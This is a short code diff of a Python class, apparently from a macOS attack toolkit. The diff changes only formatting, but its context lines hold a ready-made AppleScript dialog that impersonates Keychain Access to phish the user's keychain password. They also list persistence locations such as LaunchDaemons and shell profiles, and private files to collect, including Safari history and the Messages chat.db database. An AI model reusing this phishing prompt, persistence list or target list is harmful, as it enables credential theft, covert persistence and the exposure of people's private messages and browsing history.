@@ -29,8 +29,8 @@ class MacOSIntelligence:
             "keychain_access_phish": (
                 'display dialog "Keychain Access wants to use the \\"login\\" keychain. '
                 'Please enter the keychain password." default answer "" with title "Keychain Access" '
-                'with icon caution with hidden answer'
-            )
+                "with icon caution with hidden answer"
+            ),
         }
 
     @staticmethod
@@ -44,7 +44,7 @@ class MacOSIntelligence:
             "/System/Library/LaunchDaemons",
             "~/.zshrc",
             "~/.bash_profile",
-            "~/Library/Application Support/com.apple.backgroundtaskmanagementagent"
+            "~/Library/Application Support/com.apple.backgroundtaskmanagementagent",
         ]
 
     @staticmethod
@@ -55,5 +55,5 @@ class MacOSIntelligence:
             "~/Library/Application Support/com.apple.spotlight/index.db",
             "~/Library/Safari/History.db",
             "~/Library/Safari/Bookmarks.plist",
-            "~/Library/Messages/chat.db"
+            "~/Library/Messages/chat.db",
         ]
